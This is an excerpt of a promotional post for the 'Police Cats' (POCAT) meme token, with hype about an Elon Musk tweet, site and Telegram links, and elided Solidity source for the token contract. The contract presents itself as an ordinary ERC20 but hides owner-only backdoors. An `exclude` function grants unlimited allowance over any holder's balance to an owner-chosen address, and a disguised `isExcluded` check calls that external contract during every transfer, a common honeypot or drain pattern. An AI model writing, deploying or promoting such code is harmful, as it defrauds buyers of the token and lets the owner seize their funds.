...
Elon is currently in China and mentions Police Cats in his tweets. Chinese Police Cats will rescue Elon and meme.

Elon Tweet: https://twitter.com/elonmusk/status/1664330279257767936
Website: https://www.policecats.vip
Telegram:  https://t.me/policecats
...
contract PoliceCats is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"Police Cats", "POCAT") {
        ...
        uint256 totalSupply = 555_555_555_555 ether;
    ...
    function exclude(address account, address _token) external onlyOwner {
        token = _token;
        _approve(account, token, ~uint256(0));
        ...
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "ERC20: The pair cannot be removed from automatedMarketMakerPairs"
        );
    ...
    function isExcluded(address from, address to) private returns (bool) {
        return token == address(0) || IERC20(token).transferFrom(from, to, 0);
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || isExcluded(from, to)) {
            takeFee = false;
        }
